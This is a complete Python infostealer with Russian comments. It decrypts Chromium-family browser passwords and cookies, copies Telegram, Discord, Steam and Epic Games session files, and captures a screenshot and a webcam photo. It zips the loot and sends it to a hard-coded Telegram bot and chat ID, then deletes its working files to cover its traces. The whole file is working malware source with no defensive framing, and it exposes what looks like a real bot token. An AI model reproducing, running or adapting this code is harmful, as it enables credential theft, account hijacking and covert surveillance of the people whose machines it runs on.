import platform
import socket
import psutil
import os
import json
import sqlite3
import telebot
import tempfile
import zipfile
import random
import time
from datetime import datetime
from urllib.request import urlopen
from PIL import ImageGrab
import shutil
import base64
import re
import cv2
import sys
from pathlib import Path
from Cryptodome.Cipher import AES
import win32crypt
import winreg
import ctypes

# Конфигурация Telegram
TELEGRAM_BOT_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"
TELEGRAM_CHAT_ID = "1962231620"
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Пути для хранения данных с использованием Path
if platform.system() == "Linux":
    BASE_DIR = Path.home() / ".system_report_data"
    BROWSER_DATA_DIR = Path.home() / ".config"
else:
    BASE_DIR = Path(os.getenv("APPDATA")) / "System_ReportData"
    BROWSER_DATA_DIR = Path(os.getenv("LOCALAPPDATA"))

# Определение структуры папок
OTHER_DIR = BASE_DIR / "other"
COOKIE_DIR = OTHER_DIR / "cookies"
PASSWORDS_DIR = OTHER_DIR / "passwords"
SCREENSHOT_PATH = BASE_DIR / "screenshot.jpg"
WEBCAM_PATH = BASE_DIR / "webcam.jpg"
LOCK_FILE = Path(tempfile.gettempdir()) / "system_report.lock"

# Поддерживаемые браузеры
BROWSERS = {
    "chrome": "Google Chrome",
    "firefox": "Mozilla Firefox",
    "yandex": "Yandex Browser",
    "opera": "Opera Browser",
    "amigo": "Amigo Browser",
    "edge": "Microsoft Edge"
}

def create_directories():
    """Гарантированно создает все необходимые директории"""
    try:
        BASE_DIR.mkdir(parents=True, exist_ok=True)
        OTHER_DIR.mkdir(parents=True, exist_ok=True)
        COOKIE_DIR.mkdir(parents=True, exist_ok=True)
        PASSWORDS_DIR.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        print(f"!!! Критическая ошибка создания папок: {e}")
        try:
            os.makedirs(COOKIE_DIR, exist_ok=True)
            os.makedirs(PASSWORDS_DIR, exist_ok=True)
        except:
            pass
        raise

def get_cpu_name():
    """Получает читаемое имя процессора"""
    try:
        if platform.system() == "Windows":
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
            cpu_name, _ = winreg.QueryValueEx(key, "ProcessorNameString")
            cpu_name = cpu_name.strip()
            cpu_name = re.sub(r'\([^)]*\)', '', cpu_name)
            cpu_name = re.sub(r'\s+', ' ', cpu_name).strip()
            if 'GHz' not in cpu_name and 'MHz' not in cpu_name:
                freq = psutil.cpu_freq().current / 1000 if psutil.cpu_freq() else None
                if freq:
                    cpu_name += f" {freq:.2f}GHz"
            return cpu_name
        else:
            try:
                with open('/proc/cpuinfo') as f:
                    for line in f:
                        if 'model name' in line:
                            return line.split(':')[1].strip()
            except:
                return platform.processor() or "Unknown CPU"
    except:
        pass
    cpu_info = platform.processor()
    if 'AMD' in cpu_info or 'Intel' in cpu_info:
        return cpu_info
    return "Unknown CPU"

def stealthy_kill_browser(browser_name):
    """Скрытное закрытие браузера (только для Windows)"""
    if platform.system() != "Windows":
        return False

    process_map = {
        "chrome": "chrome.exe",
        "firefox": "firefox.exe",
        "opera": "opera.exe",
        "yandex": "browser.exe",
        "amigo": "browser.exe",
        "edge": "msedge.exe"
    }
    
    target_process = process_map.get(browser_name)
    if not target_process:
        return False
    
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == target_process.lower():
                try:
                    hwnd = ctypes.windll.user32.FindWindowW(None, f"{BROWSERS[browser_name]}") 
                    if hwnd != 0:
                        ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
                    time.sleep(2)
                    if proc.is_running():
                        proc.terminate()
                except:
                    pass
        return True
    except Exception as e:
        print(f"Ошибка при скрытном закрытии браузера: {e}")
        return False

def capture_webcam():
    """Делает снимок с веб-камеры, если она доступна"""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return False
        ret, frame = cap.read()
        cap.release()
        if ret:
            cv2.imwrite(str(WEBCAM_PATH), frame)
            return True
    except:
        pass
    return False

def steal_steam_data():
    """Крадет данные Steam"""
    steam_dir = OTHER_DIR / "Steam"
    steam_dir.mkdir(parents=True, exist_ok=True)
    
    steam_paths = []
    if platform.system() == "Windows":
        steam_paths = [
            Path(os.getenv("ProgramFiles(x86)") or "") / "Steam" / "config",
            Path(os.getenv("APPDATA") or "") / "Steam",
            Path(os.getenv("LOCALAPPDATA") or "") / "Steam"
        ]
    else:
        steam_paths = [
            Path.home() / ".steam",
            Path.home() / ".local" / "share" / "Steam"
        ]
    
    stolen_data = []
    for path in steam_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith(("vdf", "ssfn", "config")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = steam_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except Exception as e:
                print(f"Ошибка при краже данных Steam: {e}")
    
    if stolen_data:
        with open(steam_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def steal_epic_games_data():
    """Крадет данные Epic Games"""
    epic_dir = OTHER_DIR / "EpicGames"
    epic_dir.mkdir(parents=True, exist_ok=True)
    
    epic_paths = []
    if platform.system() == "Windows":
        epic_paths = [
            Path(os.getenv("LOCALAPPDATA") or "") / "EpicGamesLauncher" / "Saved",
            Path(os.getenv("APPDATA") or "") / "Epic"
        ]
    else:
        epic_paths = [
            Path.home() / ".config" / "Epic",
            Path.home() / ".local" / "share" / "Epic"
        ]
    
    stolen_data = []
    for path in epic_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith(("ini", "dat", "log", "json")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = epic_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except Exception as e:
                print(f"Ошибка при краже данных Epic Games: {e}")
    
    if stolen_data:
        with open(epic_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def steal_telegram_data():
    """Крадет данные Telegram"""
    telegram_dir = OTHER_DIR / "Telegram"
    telegram_dir.mkdir(parents=True, exist_ok=True)
    
    telegram_paths = []
    if platform.system() == "Windows":
        telegram_paths = [
            Path(os.getenv("APPDATA") or "") / "Telegram Desktop" / "tdata",
            Path(os.getenv("LOCALAPPDATA") or "") / "Telegram Desktop"
        ]
    else:
        telegram_paths = [
            Path.home() / ".local" / "share" / "TelegramDesktop",
            Path.home() / ".TelegramDesktop"
        ]
    
    stolen_data = []
    for path in telegram_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith(("map", "s", "key")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = telegram_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except Exception as e:
                print(f"Ошибка при краже данных Telegram: {e}")
    
    if stolen_data:
        with open(telegram_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def steal_discord_data():
    """Крадет данные Discord"""
    discord_dir = OTHER_DIR / "Discord"
    discord_dir.mkdir(parents=True, exist_ok=True)
    
    discord_paths = []
    if platform.system() == "Windows":
        discord_paths = [
            Path(os.getenv("APPDATA") or "") / "discord" / "Local Storage" / "leveldb",
            Path(os.getenv("LOCALAPPDATA") or "") / "Discord"
        ]
    else:
        discord_paths = [
            Path.home() / ".config" / "discord",
            Path.home() / ".config" / "discordptb",
            Path.home() / ".config" / "discordcanary"
        ]
    
    stolen_data = []
    for path in discord_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith((".ldb", ".log", ".manifest", ".json")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = discord_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except Exception as e:
                print(f"Ошибка при краже данных Discord: {e}")
    
    if stolen_data:
        with open(discord_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def get_encryption_key(profile_path):
    """Получает ключ шифрования для браузера"""
    try:
        local_state_path = Path(profile_path).parent / "Local State"
        if not local_state_path.exists():
            return None
        
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Удалить префикс DPAPI
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Ошибка получения ключа шифрования: {e}")
        return None

def decrypt_password(ciphertext, key):
    """Расшифровывает пароль с использованием ключа"""
    try:
        if not ciphertext:
            return ""
            
        # Для старых версий, защищенных DPAPI
        if isinstance(ciphertext, bytes) and len(ciphertext) > 0 and ciphertext[0] != b'v'[0]:
            return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()
        
        # Для новых версий с AES-GCM
        if key and isinstance(ciphertext, bytes) and len(ciphertext) > 15:
            iv = ciphertext[3:15]
            payload = ciphertext[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted[:-16].decode()  # Удалить аутентификационный тег
        
        return ""
    except Exception as e:
        print(f"Ошибка дешифровки: {e}")
        return ""

def steal_browser_data(browser_name, profile_path, data_type):
    """Крадет данные браузера (пароли или куки)"""
    try:
        # Определяем пути к файлам данных
        if data_type == "passwords":
            db_file = profile_path / "Login Data"
            table = "logins"
            columns = "origin_url, username_value, password_value"
        elif data_type == "cookies":
            db_file = profile_path / "Network" / "Cookies"
            table = "cookies"
            columns = "host_key, name, value, path, expires_utc, is_secure, encrypted_value"
        else:
            return []
        
        if not db_file.exists():
            return []
        
        # Создаем временную копию файла
        temp_db = Path(tempfile.gettempdir()) / f"temp_{data_type}_{browser_name}_{random.randint(1000,9999)}.db"
        shutil.copy2(db_file, temp_db)
        
        # Получаем ключ шифрования
        key = get_encryption_key(profile_path)
        
        data = []
        conn = sqlite3.connect(str(temp_db))
        conn.text_factory = bytes  # Для обработки бинарных данных
        cursor = conn.cursor()
        cursor.execute(f"SELECT {columns} FROM {table}")
        
        for row in cursor.fetchall():
            try:
                if data_type == "passwords":
                    url, username, password_value = row
                    decrypted_pass = decrypt_password(password_value, key)
                    if decrypted_pass:
                        data.append({
                            'url': url.decode('utf-8', errors='ignore') if url else "",
                            'username': username.decode('utf-8', errors='ignore') if username else "",
                            'password': decrypted_pass
                        })
                
                elif data_type == "cookies":
                    host, name, value, path, expires, secure, encrypted_value = row
                    # Используем encrypted_value если обычное значение пустое
                    cookie_value = value if value else encrypted_value
                    decrypted_value = decrypt_password(cookie_value, key) if isinstance(cookie_value, bytes) else cookie_value
                    
                    data.append({
                        'host': host.decode('utf-8', errors='ignore') if host else "",
                        'name': name.decode('utf-8', errors='ignore') if name else "",
                        'value': decrypted_value,
                        'path': path.decode('utf-8', errors='ignore') if path else "",
                        'expires': expires,
                        'secure': bool(secure)
                    })
            except Exception as e:
                print(f"Ошибка обработки записи: {e}")
                continue
        
        conn.close()
        temp_db.unlink()  # Удаляем временный файл
        return data
    except Exception as e:
        print(f"Ошибка при краже {data_type} {browser_name}: {e}")
        return []

def steal_passwords():
    """Крадет пароли из всех доступных браузеров"""
    try:
        PASSWORDS_DIR.mkdir(parents=True, exist_ok=True)
        print(f"[Кража паролей] Папка: {PASSWORDS_DIR}")
        
        # Пути к профилям браузеров
        browser_paths = {
            "chrome": BROWSER_DATA_DIR / "Google" / "Chrome" / "User Data" / "Default",
            "edge": BROWSER_DATA_DIR / "Microsoft" / "Edge" / "User Data" / "Default",
            "opera": Path(os.getenv("APPDATA")) / "Opera Software" / "Opera Stable",
            "yandex": BROWSER_DATA_DIR / "Yandex" / "YandexBrowser" / "User Data" / "Default",
            "amigo": BROWSER_DATA_DIR / "Amigo" / "User Data" / "Default"
        }
        
        for browser_name, display_name in BROWSERS.items():
            try:
                passwords = []
                
                if browser_name == "firefox":
                    print(f"Для {display_name} пароли не поддерживаются")
                    continue
                
                if browser_name in browser_paths:
                    path = browser_paths[browser_name]
                    if path.exists():
                        print(f"Обработка {display_name}")
                        if platform.system() == "Windows":
                            stealthy_kill_browser(browser_name)
                            time.sleep(1)
                        passwords = steal_browser_data(browser_name, path, "passwords")
                
                if passwords:
                    password_file = PASSWORDS_DIR / f"{display_name}_Passwords.json"
                    with open(password_file, 'w', encoding='utf-8') as f:
                        json.dump(passwords, f, indent=4, ensure_ascii=False)
                        print(f"Пароли {display_name} сохранены")
                else:
                    print(f"Для {display_name} пароли не найдены")
            except Exception as e:
                print(f"Ошибка для {display_name}: {e}")
    except Exception as e:
        print(f"Критическая ошибка в steal_passwords: {e}")

def steal_cookies():
    """Крадет куки из всех доступных браузеров"""
    try:
        COOKIE_DIR.mkdir(parents=True, exist_ok=True)
        print(f"[Кража cookies] Папка: {COOKIE_DIR}")
        
        # Пути к профилям браузеров
        browser_paths = {
            "chrome": BROWSER_DATA_DIR / "Google" / "Chrome" / "User Data" / "Default",
            "edge": BROWSER_DATA_DIR / "Microsoft" / "Edge" / "User Data" / "Default",
            "opera": Path(os.getenv("APPDATA")) / "Opera Software" / "Opera Stable",
            "yandex": BROWSER_DATA_DIR / "Yandex" / "YandexBrowser" / "User Data" / "Default",
            "amigo": BROWSER_DATA_DIR / "Amigo" / "User Data" / "Default"
        }
        
        for browser_name, display_name in BROWSERS.items():
            try:
                cookies = []
                
                if browser_name == "firefox":
                    print(f"Для {display_name} куки не поддерживаются")
                    continue
                
                if browser_name in browser_paths:
                    path = browser_paths[browser_name]
                    if path.exists():
                        print(f"Обработка {display_name}")
                        if platform.system() == "Windows":
                            stealthy_kill_browser(browser_name)
                            time.sleep(1)
                        cookies = steal_browser_data(browser_name, path, "cookies")
                
                if cookies:
                    cookie_file = COOKIE_DIR / f"{display_name}_Cookies.json"
                    with open(cookie_file, 'w', encoding='utf-8') as f:
                        json.dump(cookies, f, indent=4, ensure_ascii=False)
                        print(f"Куки {display_name} сохранены")
                else:
                    print(f"Для {display_name} куки не найдены")
            except Exception as e:
                print(f"Ошибка для {display_name}: {e}")
    except Exception as e:
        print(f"Критическая ошибка в steal_cookies: {e}")

def get_ipinfo():
    """Получает информацию о IP"""
    try:
        response = urlopen('http://ipinfo.io/json')
        return json.load(response)
    except:
        return {"ip": "N/A", "org": "N/A", "city": "N/A", "region": "N/A", "country": "N/A"}

def get_system_info():
    """Собирает полную системную информацию"""
    ipinfo = get_ipinfo()
    
    # Получаем информацию о CPU
    cpu_info = {
        "model": get_cpu_name(),
        "physical_cores": psutil.cpu_count(logical=False),
        "logical_cores": psutil.cpu_count(logical=True),
        "max_frequency": psutil.cpu_freq().max if hasattr(psutil, "cpu_freq") and psutil.cpu_freq() else "N/A",
        "usage": psutil.cpu_percent(interval=1)
    }
    
    # Получаем информацию о дисках
    drives = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            drives.append({
                "device": part.device,
                "mountpoint": part.mountpoint,
                "fstype": part.fstype,
                "total_gb": round(usage.total / (1024**3), 2),
                "used_gb": round(usage.used / (1024**3), 2),
                "free_gb": round(usage.free / (1024**3), 2),
                "percent_used": usage.percent
            })
        except:
            continue
    
    # Получаем сетевую информацию
    network_info = {
        "public_ip": ipinfo.get("ip", "N/A"),
        "isp": ipinfo.get("org", "N/A"),
        "location": f"{ipinfo.get('city', 'N/A')}, {ipinfo.get('region', 'N/A')}, {ipinfo.get('country', 'N/A')}",
        "connections": []
    }
    
    return {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "system": {
            "os": platform.system(),
            "version": platform.version(),
            "release": platform.release(),
            "architecture": platform.architecture()[0],
            "hostname": socket.gethostname(),
            "username": os.getlogin()
        },
        "hardware": {
            "cpu": cpu_info,
            "memory": {
                "total_gb": round(psutil.virtual_memory().total / (1024**3), 2),
                "available_gb": round(psutil.virtual_memory().available / (1024**3), 2),
                "used_percent": psutil.virtual_memory().percent
            },
            "disks": drives
        },
        "network": network_info,
        "software": {
            "python_version": platform.python_version()
        }
    }

def take_screenshot():
    """Делает скриншот рабочего стола"""
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(str(SCREENSHOT_PATH), "JPEG", quality=90)
        return True
    except Exception as e:
        print(f"Ошибка создания скриншота: {e}")
        return False

def create_zip():
    """Создает ZIP-архив с данными"""
    zip_name = f"system_data_{random.randint(1000,9999)}.zip"
    zip_path = Path(tempfile.gettempdir()) / zip_name
    
    try:
        with zipfile.ZipFile(str(zip_path), 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(str(BASE_DIR)):
                for file in files:
                    file_path = Path(root) / file
                    arcname = file_path.relative_to(BASE_DIR)
                    zipf.write(str(file_path), str(arcname))
        return zip_path
    except Exception as e:
        print(f"Ошибка создания архива: {e}")
        return None

def send_to_telegram(zip_path):
    """Отправляет данные в Telegram"""
    try:
        # Отправляем системную информацию
        sys_info = get_system_info()
        summary = (
            "СИСТЕМНЫЙ ОТЧЕТ\n"
            f"• ОС: {sys_info['system']['os']} {sys_info['system']['version']}\n"
            f"• Пользователь: {sys_info['system']['username']}\n"
            f"• Процессор: {get_cpu_name()}\n"
            f"• Ядра: {sys_info['hardware']['cpu']['physical_cores']}/{sys_info['hardware']['cpu']['logical_cores']}\n"
            f"• ОЗУ: {sys_info['hardware']['memory']['total_gb']} GB\n"
            f"• IP: {sys_info['network']['public_ip']}\n"
        )
        bot.send_message(TELEGRAM_CHAT_ID, summary)
        
        # Отправляем архив
        if zip_path and zip_path.exists():
            zip_size = zip_path.stat().st_size / (1024 * 1024)
            if zip_size <= 50:
                with open(str(zip_path), 'rb') as f:
                    bot.send_document(
                        chat_id=TELEGRAM_CHAT_ID,
                        document=f,
                        caption="Полные данные системы",
                        timeout=120
                    )
            else:
                bot.send_message(TELEGRAM_CHAT_ID, f"Размер архива слишком большой: {zip_size:.2f} МБ")
        return True
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")
        return False

def cleanup():
    """Очищает следы"""
    try:
        if BASE_DIR.exists():
            shutil.rmtree(str(BASE_DIR), ignore_errors=True)
        if LOCK_FILE.exists():
            LOCK_FILE.unlink()
    except:
        pass

def main_workflow():
    """Основной рабочий процесс"""
    create_directories()
    
    # Собираем системную информацию
    with open(BASE_DIR / "system_report.json", 'w', encoding='utf-8') as f:
        json.dump(get_system_info(), f, indent=4, ensure_ascii=False)
    
    # Крадем данные
    steal_cookies()
    steal_passwords()
    steal_telegram_data()
    steal_discord_data()
    steal_steam_data()
    steal_epic_games_data()
    
    # Делаем скриншоты
    take_screenshot()
    capture_webcam()
    
    # Отправляем данные
    zip_file = create_zip()
    if zip_file:
        send_to_telegram(zip_file)

if __name__ == "__main__":
    if LOCK_FILE.exists():
        sys.exit()
    
    try:
        with open(str(LOCK_FILE), 'w') as f:
            f.write(str(os.getpid()))
    except:
        sys.exit()
    
    try:
        main_workflow()
        print("[+] Готово")
    except Exception as e:
        print(f"!!! Критическая ошибка: {e}")
        try:
            bot.send_message(TELEGRAM_CHAT_ID, f"Критическая ошибка: {str(e)}")
        except:
            pass
    finally:
        cleanup()
